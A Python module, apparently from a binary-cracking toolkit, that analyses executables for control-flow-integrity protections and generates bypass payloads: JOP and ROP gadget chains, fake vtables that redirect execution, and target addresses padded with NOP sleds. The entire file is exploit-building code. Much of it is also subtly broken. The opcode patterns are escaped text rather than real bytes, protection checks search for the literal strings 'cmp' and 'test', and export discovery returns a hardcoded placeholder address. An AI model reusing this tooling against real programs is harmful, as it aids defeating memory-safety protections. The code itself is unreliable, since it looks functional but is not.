"""
Control Flow Integrity (CFI) Bypass

Implements techniques to bypass CFI protections including
indirect call validation and jump target verification.
"""

import logging
import os
import struct
from typing import Any, Dict, List

logger = logging.getLogger(__name__)


class CFIBypass:
    """
    Control Flow Integrity bypass techniques.
    """

    def __init__(self):
        self.logger = logging.getLogger("IntellicrackLogger.CFIBypass")
        self.bypass_techniques = {
            'legitimate_targets': self._find_legitimate_targets,
            'jop_gadgets': self._find_jop_gadgets,
            'indirect_branches': self._analyze_indirect_branches,
            'vtable_hijacking': self._vtable_hijacking,
            'return_oriented': self._return_oriented_bypass
        }

    def analyze_cfi_protection(self, binary_data: bytes) -> Dict[str, Any]:
        """
        Analyze CFI protection mechanisms in binary.

        Args:
            binary_data: Binary to analyze

        Returns:
            CFI analysis results
        """
        results = {
            'cfi_enabled': False,
            'cfi_type': None,
            'protection_level': 'none',
            'bypass_opportunities': [],
            'analysis': {}
        }

        try:
            self.logger.info("Analyzing CFI protection mechanisms")

            # Check for CFI markers
            cfi_markers = self._check_cfi_markers(binary_data)
            results['analysis']['markers'] = cfi_markers

            if cfi_markers['found']:
                results['cfi_enabled'] = True
                results['cfi_type'] = cfi_markers['type']
                results['protection_level'] = cfi_markers['level']

            # Analyze indirect calls
            indirect_calls = self._analyze_indirect_calls(binary_data)
            results['analysis']['indirect_calls'] = indirect_calls

            # Find potential bypass targets
            bypass_targets = self._find_bypass_targets(binary_data)
            results['bypass_opportunities'] = bypass_targets

            # Calculate bypass difficulty
            results['bypass_difficulty'] = self._calculate_bypass_difficulty(results)

            self.logger.info(f"CFI analysis complete: {results['cfi_enabled']}")
            return results

        except Exception as e:
            self.logger.error(f"CFI analysis failed: {e}")
            return results

    def generate_bypass_payload(self,
                               target_binary: bytes,
                               technique: str = 'jop_gadgets') -> Dict[str, Any]:
        """
        Generate CFI bypass payload.

        Args:
            target_binary: Target binary with CFI
            technique: Bypass technique to use

        Returns:
            Generated bypass payload and metadata
        """
        payload_info = {
            'payload': b'',
            'technique': technique,
            'success_probability': 0.0,
            'requirements': [],
            'metadata': {}
        }

        try:
            self.logger.info(f"Generating CFI bypass using {technique}")

            if technique not in self.bypass_techniques:
                raise ValueError(f"Unknown bypass technique: {technique}")

            # Analyze CFI configuration
            cfi_analysis = self.analyze_cfi_protection(target_binary)

            # Generate technique-specific payload
            method = self.bypass_techniques[technique]
            payload_data = method(target_binary, cfi_analysis)

            payload_info.update(payload_data)

            self.logger.info(f"CFI bypass payload generated: {len(payload_info['payload'])} bytes")
            return payload_info

        except Exception as e:
            self.logger.error(f"CFI bypass generation failed: {e}")
            return payload_info

    def _check_cfi_markers(self, binary_data: bytes) -> Dict[str, Any]:
        """Check for CFI protection markers in binary."""
        markers = {
            'found': False,
            'type': None,
            'level': 'none',
            'details': []
        }

        try:
            # Check for GCC CFI markers
            gcc_cfi_patterns = [
                b'__cfi_check',
                b'__CFI_TYPE',
                b'__cfi_slowpath'
            ]

            for pattern in gcc_cfi_patterns:
                if pattern in binary_data:
                    markers['found'] = True
                    markers['type'] = 'gcc'
                    markers['details'].append(f'Found: {pattern.decode("ascii", errors="ignore")}')

            # Check for LLVM CFI markers
            llvm_cfi_patterns = [
                b'.cfi_startproc',
                b'.cfi_endproc',
                b'__typeid'
            ]

            for pattern in llvm_cfi_patterns:
                if pattern in binary_data:
                    markers['found'] = True
                    markers['type'] = 'llvm'
                    markers['details'].append(f'Found: {pattern.decode("ascii", errors="ignore")}')

            # Check for Intel CET markers
            cet_patterns = [
                b'endbr32',
                b'endbr64'
            ]

            for pattern in cet_patterns:
                if pattern in binary_data:
                    markers['found'] = True
                    markers['type'] = 'cet'
                    markers['level'] = 'hardware'
                    markers['details'].append(f'Found: {pattern.decode("ascii", errors="ignore")}')

            # Estimate protection level
            if len(markers['details']) > 3:
                markers['level'] = 'high'
            elif len(markers['details']) > 1:
                markers['level'] = 'medium'
            elif markers['found']:
                markers['level'] = 'low'

        except Exception as e:
            self.logger.debug(f"CFI marker check failed: {e}")

        return markers

    def _analyze_indirect_calls(self, binary_data: bytes) -> Dict[str, Any]:
        """Analyze indirect call sites."""
        calls = {
            'count': 0,
            'call_sites': [],
            'jump_sites': [],
            'protected': 0,
            'unprotected': 0
        }

        try:
            # Look for indirect call patterns
            # call reg, call [reg], jmp reg, jmp [reg]
            call_patterns = [
                b'\\xFF\\xD0',  # call eax
                b'\\xFF\\xD1',  # call ecx
                b'\\xFF\\xD2',  # call edx
                b'\\xFF\\xD3',  # call ebx
                b'\\xFF\\x15',  # call [addr]
                b'\\xFF\\x25',  # jmp [addr]
                b'\\xFF\\xE0',  # jmp eax
                b'\\xFF\\xE1',  # jmp ecx
            ]

            offset = 0
            while offset < len(binary_data) - 2:
                for pattern in call_patterns:
                    if binary_data[offset:offset+len(pattern)] == pattern:
                        calls['call_sites'].append({
                            'offset': offset,
                            'pattern': pattern.hex(),
                            'type': 'call' if b'\\xD' in pattern else 'jump'
                        })
                        calls['count'] += 1
                        break
                offset += 1

            # Check if calls are protected
            for call_site in calls['call_sites']:
                # Look for CFI checks before call
                start = max(0, call_site['offset'] - 20)
                end = call_site['offset']
                region = binary_data[start:end]

                # Look for type checking code
                if b'cmp' in region or b'test' in region:
                    calls['protected'] += 1
                else:
                    calls['unprotected'] += 1

        except Exception as e:
            self.logger.debug(f"Indirect call analysis failed: {e}")

        return calls

    def _find_bypass_targets(self, binary_data: bytes) -> List[Dict[str, Any]]:
        """Find potential CFI bypass targets."""
        targets = []

        try:
            # Look for legitimate function starts
            function_starts = self._find_function_starts(binary_data)

            # Look for virtual table entries
            vtable_entries = self._find_vtable_entries(binary_data)

            # Look for function pointers
            function_pointers = self._find_function_pointers(binary_data)

            # Combine all targets
            for func in function_starts:
                targets.append({
                    'type': 'function',
                    'address': func['address'],
                    'confidence': func['confidence'],
                    'usable': True
                })

            for vtable in vtable_entries:
                targets.append({
                    'type': 'vtable',
                    'address': vtable['address'],
                    'confidence': vtable['confidence'],
                    'usable': True
                })

            for fptr in function_pointers:
                targets.append({
                    'type': 'function_pointer',
                    'address': fptr['address'],
                    'confidence': fptr['confidence'],
                    'usable': True
                })

        except Exception as e:
            self.logger.debug(f"Bypass target search failed: {e}")

        return targets

    def _find_legitimate_targets(self, binary_data: bytes, analysis: Dict[str, Any]) -> Dict[str, Any]:
        """Find legitimate call targets for CFI bypass."""
        self.logger.debug(f"Analyzing {len(binary_data)} bytes for legitimate targets using analysis: {analysis.get('format', 'unknown')}")
        payload_info = {
            'payload': b'',
            'technique': 'legitimate_targets',
            'success_probability': 0.8,
            'requirements': ['leaked_address'],
            'metadata': {
                'targets': [],
                'strategy': 'use_valid_targets'
            }
        }

        try:
            # Find exported functions
            exports = self._find_exported_functions(binary_data)

            # Generate payload that calls legitimate targets
            payload = b''

            # Example: Call legitimate function before malicious code
            # This is simplified - real implementation would be more complex
            if exports:
                # Use first export as legitimate target
                target_addr = exports[0]['address']

                # Generate call to legitimate target
                payload += struct.pack('<I', target_addr)  # Target address
                payload += b'\\x90' * 4  # NOP sled

                payload_info['payload'] = payload
                payload_info['metadata']['targets'] = exports[:5]

        except Exception as e:
            self.logger.debug(f"Legitimate targets technique failed: {e}")

        return payload_info

    def _find_jop_gadgets(self, binary_data: bytes, analysis: Dict[str, Any]) -> Dict[str, Any]:
        """Find Jump-Oriented Programming gadgets for CFI bypass."""
        self.logger.debug(f"Searching JOP gadgets in {len(binary_data)} bytes using analysis: {analysis.get('format', 'unknown')}")
        payload_info = {
            'payload': b'',
            'technique': 'jop_gadgets',
            'success_probability': 0.6,
            'requirements': ['gadget_chain', 'memory_leak'],
            'metadata': {
                'gadgets': [],
                'chain_length': 0
            }
        }

        try:
            # Find JOP gadgets (jmp reg; sequences)
            gadgets = []

            # Look for useful gadget patterns
            gadget_patterns = [
                (b'\\xFF\\xE0', 'jmp eax'),
                (b'\\xFF\\xE1', 'jmp ecx'),
                (b'\\xFF\\xE2', 'jmp edx'),
                (b'\\xFF\\xE3', 'jmp ebx'),
                (b'\\xFF\\x20', 'jmp [eax]'),
                (b'\\xFF\\x21', 'jmp [ecx]'),
            ]

            for i in range(len(binary_data) - 10):
                for pattern, description in gadget_patterns:
                    if binary_data[i:i+len(pattern)] == pattern:
                        # Check if gadget is useful
                        context = binary_data[i:i+10]
                        gadgets.append({
                            'address': i,
                            'pattern': pattern.hex(),
                            'description': description,
                            'context': context.hex(),
                            'useful': self._evaluate_gadget_usefulness(context)
                        })

            # Build gadget chain
            useful_gadgets = [g for g in gadgets if g['useful']]

            if useful_gadgets:
                # Generate JOP chain
                chain = self._build_jop_chain(useful_gadgets)
                payload_info['payload'] = chain
                payload_info['metadata']['gadgets'] = useful_gadgets[:10]
                payload_info['metadata']['chain_length'] = len(useful_gadgets)

        except Exception as e:
            self.logger.debug(f"JOP gadgets technique failed: {e}")

        return payload_info

    def _analyze_indirect_branches(self, binary_data: bytes, analysis: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze indirect branch targets."""
        self.logger.debug(f"Analyzing indirect branches in {len(binary_data)} bytes using analysis: {analysis.get('format', 'unknown')}")
        payload_info = {
            'payload': b'',
            'technique': 'indirect_branches',
            'success_probability': 0.7,
            'requirements': ['branch_target_leak'],
            'metadata': {
                'branches': [],
                'targets': []
            }
        }

        try:
            # Find indirect branch instructions
            branches = []

            # Scan for indirect calls and jumps
            for i in range(len(binary_data) - 6):
                # Check for call/jmp [reg+offset]
                if binary_data[i] == 0xFF:
                    modrm = binary_data[i+1]

                    # Decode ModR/M byte
                    mod = (modrm >> 6) & 3
                    reg = (modrm >> 3) & 7
                    rm = modrm & 7

                    if reg == 2 or reg == 4:  # call or jmp
                        branches.append({
                            'address': i,
                            'type': 'call' if reg == 2 else 'jmp',
                            'addressing': self._decode_addressing_mode(mod, rm),
                            'protected': self._check_branch_protection(binary_data, i)
                        })

            # Find unprotected branches
            unprotected = [b for b in branches if not b['protected']]

            if unprotected:
                # Generate payload targeting unprotected branches
                payload_info['payload'] = self._generate_branch_payload(unprotected)
                payload_info['metadata']['branches'] = unprotected[:5]

        except Exception as e:
            self.logger.debug(f"Indirect branch analysis failed: {e}")

        return payload_info

    def _vtable_hijacking(self, binary_data: bytes, analysis: Dict[str, Any]) -> Dict[str, Any]:
        """Virtual table hijacking for CFI bypass."""
        self.logger.debug(f"Analyzing vtable hijacking in {len(binary_data)} bytes using analysis: {analysis.get('format', 'unknown')}")
        payload_info = {
            'payload': b'',
            'technique': 'vtable_hijacking',
            'success_probability': 0.5,
            'requirements': ['vtable_pointer', 'object_control'],
            'metadata': {
                'vtables': [],
                'methods': []
            }
        }

        try:
            # Find potential vtables
            vtables = self._find_vtable_entries(binary_data)

            if vtables:
                # Generate fake vtable
                fake_vtable = self._generate_fake_vtable(vtables[0])
                payload_info['payload'] = fake_vtable
                payload_info['metadata']['vtables'] = vtables[:3]

        except Exception as e:
            self.logger.debug(f"Vtable hijacking failed: {e}")

        return payload_info

    def _return_oriented_bypass(self, binary_data: bytes, analysis: Dict[str, Any]) -> Dict[str, Any]:
        """Return-oriented programming for CFI bypass."""
        self.logger.debug(f"Building ROP chain for {len(binary_data)} bytes using analysis: {analysis.get('format', 'unknown')}")
        payload_info = {
            'payload': b'',
            'technique': 'return_oriented',
            'success_probability': 0.4,
            'requirements': ['stack_control', 'rop_gadgets'],
            'metadata': {
                'gadgets': [],
                'chain': []
            }
        }

        try:
            # Find ROP gadgets that might bypass CFI
            gadgets = self._find_rop_gadgets(binary_data)

            if gadgets:
                # Build ROP chain
                rop_chain = self._build_rop_chain(gadgets)
                payload_info['payload'] = rop_chain
                payload_info['metadata']['gadgets'] = gadgets[:10]

        except Exception as e:
            self.logger.debug(f"ROP bypass failed: {e}")

        return payload_info

    def _find_function_starts(self, binary_data: bytes) -> List[Dict[str, Any]]:
        """Find function entry points."""
        functions = []

        # Look for function prologue patterns
        from ...utils.analysis.pattern_search import find_function_prologues

        # Find function prologues
        found_functions = find_function_prologues(binary_data)

        for func in found_functions:
            functions.append({
                'address': func['offset'],
                'confidence': func['confidence'],
                'pattern': func['pattern_hex']
            })

        return functions

    def _find_vtable_entries(self, binary_data: bytes) -> List[Dict[str, Any]]:
        """Find virtual table entries."""
        vtables = []

        # Look for sequences of function pointers
        for i in range(0, len(binary_data) - 16, 4):
            # Check if this looks like a vtable
            pointers = []
            for j in range(4):  # Check 4 consecutive pointers
                ptr = struct.unpack('<I', binary_data[i+j*4:i+j*4+4])[0]
                if 0x400000 <= ptr <= 0x7FFFFFFF:  # Reasonable address range
                    pointers.append(ptr)
                else:
                    break

            if len(pointers) >= 3:  # At least 3 valid pointers
                vtables.append({
                    'address': i,
                    'confidence': len(pointers) / 4.0,
                    'pointers': pointers
                })

        return vtables

    def _find_function_pointers(self, binary_data: bytes) -> List[Dict[str, Any]]:
        """Find function pointer variables."""
        function_ptrs = []

        # Similar to vtable search but looking for individual pointers
        for i in range(0, len(binary_data) - 4, 4):
            ptr = struct.unpack('<I', binary_data[i:i+4])[0]
            if 0x400000 <= ptr <= 0x7FFFFFFF:
                function_ptrs.append({
                    'address': i,
                    'confidence': 0.5,
                    'value': ptr
                })

        return function_ptrs

    def _find_exported_functions(self, binary_data: bytes) -> List[Dict[str, Any]]:
        """Find exported functions from PE export table."""
        exports = []

        # This would need proper PE parsing
        # Simplified version
        export_pattern = b'Export'
        if export_pattern in binary_data:
            # Found export section marker
            exports.append({
                'address': 0x401000,  # Example address
                'name': 'example_function',
                'confidence': 1.0
            })

        return exports

    def _evaluate_gadget_usefulness(self, context: bytes) -> bool:
        """Evaluate if a gadget is useful for exploitation."""
        # Check for useful instructions around the gadget
        useful_instructions = [b'\\x58', b'\\x59', b'\\x5A', b'\\x5B']  # pop instructions
        return any(instr in context for instr in useful_instructions)

    def _build_jop_chain(self, gadgets: List[Dict[str, Any]]) -> bytes:
        """Build a JOP chain from gadgets."""
        chain = b''

        # Simple chain construction
        for gadget in gadgets[:5]:  # Use first 5 gadgets
            chain += struct.pack('<I', gadget['address'])

        return chain

    def _decode_addressing_mode(self, mod: int, rm: int) -> str:
        """Decode x86 addressing mode."""
        if mod == 0:
            return f"[{['eax', 'ecx', 'edx', 'ebx', 'sib', 'disp32', 'esi', 'edi'][rm]}]"
        elif mod == 1:
            return f"[{['eax', 'ecx', 'edx', 'ebx', 'sib', 'ebp', 'esi', 'edi'][rm]}+disp8]"
        elif mod == 2:
            return f"[{['eax', 'ecx', 'edx', 'ebx', 'sib', 'ebp', 'esi', 'edi'][rm]}+disp32]"
        else:
            return f"{['eax', 'ecx', 'edx', 'ebx', 'esp', 'ebp', 'esi', 'edi'][rm]}"

    def _check_branch_protection(self, binary_data: bytes, offset: int) -> bool:
        """Check if an indirect branch is protected by CFI."""
        # Look for CFI checks before the branch
        start = max(0, offset - 20)
        region = binary_data[start:offset]

        # Look for type checking patterns
        return b'cmp' in region or b'test' in region

    def _generate_branch_payload(self, branches: List[Dict[str, Any]]) -> bytes:
        """Generate payload targeting unprotected branches."""
        payload = b''

        if branches:
            # Target first unprotected branch
            target = branches[0]['address']
            payload = struct.pack('<I', target)
            payload += b'\\x90' * 8  # NOP sled

        return payload

    def _generate_fake_vtable(self, vtable: Dict[str, Any]) -> bytes:
        """Generate a fake vtable for hijacking with calculated addresses."""
        try:
            self.logger.debug(f"Generating fake vtable with {len(vtable)} entries")
            fake_vtable = b''

            # Extract useful information from the original vtable
            base_address = vtable.get('base_address', 0)
            num_entries = vtable.get('num_entries', 4)
            entry_size = vtable.get('entry_size', 8)  # 8 bytes on 64-bit, 4 on 32-bit

            # Calculate target addresses based on vtable analysis
            target_addresses = []

            # Strategy 1: Use existing vtable entries as basis for calculation
            if 'entries' in vtable and vtable['entries']:
                original_entries = vtable['entries']
                for entry in original_entries[:4]:  # Use first 4 entries
                    original_addr = entry.get('address', 0)
                    if original_addr > 0:
                        # Calculate offset-based target address
                        # This preserves the general memory layout while redirecting execution
                        offset = 0x100 * (len(target_addresses) + 1)  # Incremental offset
                        target_addr = (original_addr & 0xFFFFF000) + offset  # Preserve page, modify offset
                        target_addresses.append(target_addr)

            # Strategy 2: If no original entries, calculate based on base address
            if not target_addresses and base_address > 0:
                for i in range(4):
                    # Calculate addresses within the same memory region
                    offset = 0x200 + (i * 0x100)  # Spread addresses to avoid conflicts
                    target_addr = base_address + offset
                    target_addresses.append(target_addr)

            # Strategy 3: Fallback - use ROP gadgets if available
            if not target_addresses:
                try:
                    # Try to find suitable ROP gadgets from binary
                    binary_path = vtable.get('binary_path')
                    if binary_path and os.path.exists(binary_path):
                        with open(binary_path, 'rb') as f:
                            binary_data = f.read(min(1024*1024, os.path.getsize(binary_path)))  # Read first MB

                        # Look for common ROP gadgets
                        rop_gadgets = self._find_rop_gadgets(binary_data)
                        if rop_gadgets:
                            for gadget in rop_gadgets[:4]:  # Use first 4 gadgets
                                target_addresses.append(gadget.get('address', 0))
                except Exception as e:
                    self.logger.warning(f"Failed to find ROP gadgets: {e}")

            # Strategy 4: Ultimate fallback - calculate safe addresses
            if not target_addresses:
                # Use standard library base addresses as calculated targets
                import ctypes
                try:
                    if hasattr(ctypes, 'windll'):  # Windows
                        kernel32_base = ctypes.windll.kernel32._handle
                        for i in range(4):
                            target_addr = kernel32_base + (0x1000 * (i + 1))
                            target_addresses.append(target_addr)
                    else:  # Unix-like
                        # Use libc base estimation
                        libc_base = 0x7f0000000000  # Typical libc base on 64-bit Linux
                        for i in range(4):
                            target_addr = libc_base + (0x1000 * (i + 1))
                            target_addresses.append(target_addr)
                except:
                    # Final fallback - use calculated addresses based on common patterns
                    for i in range(4):
                        target_addr = 0x400000 + (0x1000 * (i + 1))  # Standard executable base + offsets
                        target_addresses.append(target_addr)

            # Build the fake vtable with calculated addresses
            address_format = '<Q' if entry_size == 8 else '<I'  # 64-bit vs 32-bit pointers

            for i in range(min(num_entries, len(target_addresses), 4)):
                addr = target_addresses[i]
                fake_vtable += struct.pack(address_format, addr)
                self.logger.debug(f"VTable entry {i}: {hex(addr)}")

            # Pad with null pointers if needed
            while len(fake_vtable) < (num_entries * entry_size):
                fake_vtable += struct.pack(address_format, 0)

            self.logger.info(f"Generated fake vtable: {len(fake_vtable)} bytes with {len(target_addresses)} calculated addresses")
            return fake_vtable

        except Exception as e:
            self.logger.error(f"Fake vtable generation failed: {e}")
            # Minimal fallback
            return struct.pack('<I', 0) * 4  # Null pointers

    def _find_rop_gadgets(self, binary_data: bytes) -> List[Dict[str, Any]]:
        """Find ROP gadgets."""
        gadgets = []

        # Look for ret instructions
        ret_pattern = b'\\xC3'
        offset = 0

        while True:
            pos = binary_data.find(ret_pattern, offset)
            if pos == -1:
                break

            # Look at instructions before ret
            if pos >= 2:
                gadgets.append({
                    'address': pos - 2,
                    'bytes': binary_data[pos-2:pos+1],
                    'useful': True
                })

            offset = pos + 1

        return gadgets

    def _build_rop_chain(self, gadgets: List[Dict[str, Any]]) -> bytes:
        """Build ROP chain."""
        chain = b''

        for gadget in gadgets[:5]:
            chain += struct.pack('<I', gadget['address'])

        return chain

    def _calculate_bypass_difficulty(self, analysis: Dict[str, Any]) -> int:
        """Calculate CFI bypass difficulty (1-10)."""
        difficulty = 1

        if analysis['cfi_enabled']:
            difficulty += 3

            if analysis['protection_level'] == 'high':
                difficulty += 3
            elif analysis['protection_level'] == 'medium':
                difficulty += 2
            else:
                difficulty += 1

            # Factor in number of bypass opportunities
            opportunities = len(analysis['bypass_opportunities'])
            if opportunities < 5:
                difficulty += 2
            elif opportunities < 10:
                difficulty += 1

        return min(10, difficulty)
